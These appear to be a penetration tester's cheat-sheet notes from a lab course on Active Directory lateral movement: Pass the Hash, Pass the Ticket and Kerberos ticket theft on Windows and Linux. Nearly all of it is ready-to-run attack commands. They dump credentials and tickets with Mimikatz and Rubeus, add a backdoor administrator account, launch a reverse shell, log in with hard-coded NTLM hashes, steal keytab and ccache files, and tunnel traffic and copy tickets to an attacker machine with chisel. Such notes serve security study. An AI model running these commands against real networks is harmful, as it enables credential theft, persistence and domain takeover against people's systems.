##  Pass the Hash (PtH)
 With NTLM, passwords stored on the server and domain controller are not "salted," which means that an adversary with a password hash can authenticate a session without knowing the original password. We call this a `Pass the Hash (PtH) Attack`.
 
```bash
# from Windows

## Pass the Hash with Mimikatz
mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:<hash> /domain:<domain> /run:cmd.exe" exit  # Pass the Hash with Mimikatz , <domain> if it local we use the localhost or computure name or done (.)

## Invoke-TheHash eith SMB
Import-Module .\Invoke-TheHash.psd1
Invoke-SMBExec -Target <IP> -Domain <Domain> -Username <user> -Hash <NTLM_hash> -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose

## Invoke-TheHash with WMI
Import-Module .\Invoke-TheHash.psd1
Invoke-WMIExec -Target <IP> -Domain <Domain> -Username <user> -Hash <NTLM_hash> -Command "powershell -e <PS_reverse_shell>"

# -<DOMAIN> is unnecessary with local accounts or when using the @domain after the username.
# -Target <Machine-Name> on domain env
-----------------------------------------------------------------------------
# From Linux 

## Pass the Hash with Impacket PsExec
impacket-psexec administrator@10.129.201.126 -hashes :<hash> # on domain : MS01.inlanefreight.htb/administrator@10.129.204.23
#  also we can use:  impacket-wmiexec   impacket-atexec   impacket-smbexec 

## Pass the Hash with CrackMapExec
crackmapexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami # on domain: -d MS01.inlanefreight.htb

## Pass the Hash with evil-winrm (Linux)
evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453 # on domain use administrator@inlanefreight.htb

## Pass the Hash with RDP (Linux)
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f # Enable Restricted Admin Mode to Allow PtH
xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B #
## on local administrative accounts UAC Limits Pass the Hash for Local Accounts : UAC (User Account Control) limits local users' ability to perform remote administration operations 
# `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy` is set to 0 => admin account (RID-500, "Administrator") is the only local account allowed to perform remote administration tasks. Setting it to 1 allows the other local admins as well
#> if the registry key `FilterAdministratorToken` (disabled by default) is enabled (value 1), the RID 500 account (even if it is renamed) is enrolled in UAC protection. This means that remote PTH will fail against the machine when using that account.

```

## Pass the Ticket (PtT) from Windows
Another method for moving laterally in an Active Directory environment is called a [Pass the Ticket (PtT) attack](https://attack.mitre.org/techniques/T1550/003/). In this attack,
```bash
# Harvesting Kerberos Tickets from Windows
## On Windows, tickets are processed and stored by the LSASS
    
## Mimikatz - Export Tickets
mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" exit 
dir *.kirbi #=> [randomvalue]-username@service-domain.local.kirbi
[randomvalue]-username@krbtgt-domain.local.kirbi #=> the TGT of that account
 
[+] #Note: At the time of writing, using Mimikatz version 2.2.0 20220919, if we run "sekurlsa::ekeys" it presents all hashes as des_cbc_md4 on some Windows 10 versions. Exported tickets (sekurlsa::tickets /export) do not work correctly due to the wrong encryption. It is possible to use these hashes to generate new tickets or use Rubeus to export tickets in base64 format.

## Rubeus - Export Tickets
Rubeus.exe dump /nowrap # base64 format. (no admin priv needs)

---------------------------------------------------------------------------
# Pass the Key or OverPass the Hash

## Mimikatz - Extract Kerberos Keys
mimikatz.exe "privilege::debug" "sekurlsa::ekeys" # dump Kerberos keys from LSASS memory

# Output:
# Auth ID     → Session ID
# User/Domain → Targeted account info
# aes256_hmac → Strong Kerberos key (AES)
# rc4_hmac_nt → NTLM-based key (used in OverPass-the-Hash)
# rc4_md4     → Old NT hash key
# *_exp/_old  → Expired/legacy keys (can still work)

[+] # rc4_hmac_nt used in Rubeus or Mimikatz to craft TGT:

## Mimikatz - Pass the Key or OverPass the Hash
mimikatz.exe  "sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f" # open `cmd.exe` window that we can use to request access to any service we want in the context of the target user.

## Rubeus - Pass the Key or OverPass the Hash
Rubeus asktgt /user:plaintext /rc4:<rc4_hmac_nt> /domain:inlanefreight.htb /nowrap # forge a ticket on base64 format, the hash which can be `/rc4`, `/aes128`, `/aes256`, `/des`. we collect using Mimikatz `sekurlsa::ekeys`

[!] # **Note:** Modern Windows domains (functional level 2008 and above) use AES encryption by default in normal Kerberos exchanges. If we use a rc4_hmac (NTLM) hash in a Kerberos exchange instead of an aes256_cts_hmac_sha1 (or aes128) key, it may be detected as an "encryption downgrade."
-----------------------------------------------------------------------------
# Pass the Ticket (PtT)

## Rubeus Pass the Ticket
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt # submit the ticket TGT to the current logon session
Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi # import the ticket into the current session
### Pass the Ticket - Base64 Format
### we can perform a Pass the Ticket providing the base64 string instead of the file name.
PS > [Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))  ## Convert .kirbi to Base64 Format
Rubeus.exe ptt /ticket:<BASE64> 

## Mimikatz - Pass the Ticket
mimikatz.exe 
privilege::debug
kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"
exit
dir \\DC01.inlanefreight.htb\c$
[!] # Note: Instead of opening mimikatz.exe with cmd.exe and exiting to get the ticket into the current command prompt, we can use the Mimikatz module `misc` to launch a new command prompt window with the imported ticket using the `misc::cmd` command.
-------------------------------------------------------------------------------
# Mimikatz - PowerShell Remoting with Pass the Ticket

## Mimikatz - Pass the Ticket for Lateral Movement.
mimikatz.exe
kerberos::ptt "C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"
exit
powershell
Enter-PSSession -ComputerName DC01
whoami ; hostname  # inlanefreight\john ; DC01

## Rubeus - Pass the Ticket for Lateral Movement
Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt
c:\tools>powershell
PS C:\tools> Enter-PSSession -ComputerName DC01
whoami ; hostname  # inlanefreight\john ; DC01
```

## Pass the Ticket (PtT) from Linux
we manage to compromise a Linux machine connected to Active Directory. In that case, we could try to find Kerberos tickets to impersonate other users and gain more access to the network.
```bash
# Kerberos tickets stored in: 
/tmp #  (moste case)
KRB5CCNAME  # environment variable (By default) 
/etc/krb5.keytab  # machine account (access from root user only)

# A keytab is a file containing pairs of Kerberos principals and encrypted keys

realm list # Checking domain access setup
id <user>@<domain> #  Checking what groups a user belongs to
ps -ef | grep -i "winbind\|sssd" # Check If Linux Machine is Domain Joine

-----------------------------------------------------------------------------
## Finding Kerberos Tickets in Linux

### Finding Keytab Files (used to get the TGT )

find / -name *keytab* -ls 2>/dev/null# file.keytab
find / \( -name '*keytab*' -o -name '*.kt' \) -ls 2>/dev/null # *.kt too

[+] # Note : To use a keytab file, we must have read and write (rw) privileges on the file.

### Identifying Keytab Files in Cronjobs

crontab -l # * /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh
cat /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh #=> kinit svc_workstations@INLANEFREIGHT.HTB -k -t /home/carlos@inlanefreight.htb/.scripts/svc_workstations.kt
==> svc_workstations.kt # script importing a Kerberos ticket 
[+] # Note: As we discussed in the Pass the Ticket from Windows section, a computer account needs a ticket to interact with the Active Directory environment. Similarly, a Linux domain joined machine needs a ticket. The ticket is represented as a keytab file located by default at `/etc/krb5.keytab` and can only be read by the root user. If we gain access to this ticket, we can impersonate the computer account LINUX01$.INLANEFREIGHT.HTB
------------------------------------------------------------------------------
### Finding ccache Files (TGT ticket)

#### Reviewing Environment Variables for ccache Files.
env | grep -i krb5 # KRB5CCNAME=FILE:/tmp/krb5cc_647402606_qd2Pfh

#### Searching for ccache Files in /tmp
ls -la /tmp 
-----------------------------------------------------------------------------
## Abusing KeyTab Files

### Listing keytab File Information
klist -k -t /opt/specialfiles/carlos.keytab #=> carlos@INLANEFREIGHT.HTB

### Impersonating a User with a keytab
klist #=> david@INLANEFREIGHT.HTB (the current ticket we are using)
kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab # import the carlos ticket
klist #=> carlos@INLANEFREIGHT.HTB 

smbclient //dc01/carlos -k -c ls # Connecting to SMB Share as Carlos
-------------------------
### Keytab Extract
python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab # NTLM , AES-256 , AES-128 
- # NTLM -> pass the hash attack
- # AES-256 + AES-128 -> forge our tickets
- su - carlos@inlanefreight.htb # crack the hash to get the plaintext pass then login as carlos
-----------------------------------------------------------------------------
## Abusing cronjob Keytab
repeat the process, crack the password, and log in as #=> svc_workstations user
-----------------------------------------------------------------------------
## Abusing Keytab ccache

/tmp # we need priv sec to read the keytab file

## priv esc to root (to read the /tmp keytab )
### from Abusing cronjob Keytab or tabkey  we extract the hash and crack the pass of svc_workstations user 
ssh svc_workstations@inlanefreight.htb@10.129.204.23 -p 2222 # login with the password that we crack it 
sudo -l #  (ALL) ALL (we have priv to run sudo without pass)
sudo su # whoami : root

##  Looking for ccache Files
ls -la /tmp #=> krb5cc_647401106_I8I133  - USER : julio@inlanefreight.htb
id julio@inlanefreight.htb #=> domain users (indentify the group membership)

## Importing the ccache File into our Current Session
klist # No credentials cache found 
cp /tmp/krb5cc_647401106_I8I133 .
export KRB5CCNAME=/root/krb5cc_647401106_I8I133
klist # Ticket cache: FILE:/root/krb5cc_647401106_I8I133 : julio
smbclient //dc01/C$ -k -c ls -no-pass

[+] If the expiration date has passed, the ticket will not work.
-------------------------------------------------------------------------------
## Using Linux Attack Tools with Kerberos

[+] # our attacker machine don't have connection to the Domain controller so we need to setup the trafft to the compromised domain joined machine (ex, MS01)
-----------------
### setup traffic via the compromised domain joined machine

#### on attacker machine
cat /etc/hosts
# 172.16.1.10 inlanefreight.htb   inlanefreight   dc01.inlanefreight.htb  dc01
# 172.16.1.5  ms01.inlanefreight.htb  ms01
cat /etc/proxychains4.conf #=>  socks5 127.0.0.1 1080
./chisel server --reverse --socks5 # Listening on http://0.0.0.0:8080

#### on the compromised domaain joined machine (MS01)
xfreerdp /v:10.129.204.23 /u:david /d:inlanefreight.htb /p:Password2 /dynamic-resolution # connect to MS01
./chisel client <your-attacker-ip>:8080 R:socks
copy <keytab-ticket> \\attacker-ip\tmp # mov the ticket to the attacker machine

#### on attacker machine
export KRB5CCNAME=/home/htb-student/krb5cc_647401106_I8I133 # Setting the ticket Environment Variable
---------------------
### Impacket

proxychains impacket-wmiexec dc01 -k # => whoami : inlanefreight\julio
[+] # Note: If you are using Impacket tools from a Linux machine connected to the domain, note that some Linux Active Directory implementations use the FILE: prefix in the KRB5CCNAME variable. If this is the case, we need to modify the variable only to include the path to the ccache file.

### Evil-Winrm
#### Installing Kerberos Authentication Package
sudo apt-get install krb5-user -y 
# set  the Default Kerberos Version 5 realm : "INLANEFREIGHT.HTB"
# set the  Administrative Server for your Kerberos Realm to  "DC01"

cat /etc/krb5.conf
[libdefaults]
        default_realm = INLANEFREIGHT.HTB

<SNIP>

[realms]
    INLANEFREIGHT.HTB = {
        kdc = dc01.inlanefreight.htb
    }
<SNIP>
#### Using Evil-WinRM with Kerberos
proxychains evil-winrm -i dc01 -r inlanefreight.htb #=> whoami : julio ; hostname : DC01
-------------------------------------------------------------------------------
## Convert tickets   

impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi # linux tickets to windows tickets
impacket-ticketConverter julio.kirbi krb5cc_647401106_I8I133 # windows tickets to linux tickets

#### Importing Converted Ticket into Windows Session with Rubeus
C:\tools\Rubeus.exe ptt /ticket:c:\tools\julio.kirbi 
klist # julio @ INLANEFREIGHT.HTB :  krbtgt
dir \\dc01\julio
-------------------------------------------------------------------------------
## Linikatz
./linikatz.sh # creds & tickets dump  (mimikatz version for linux)
```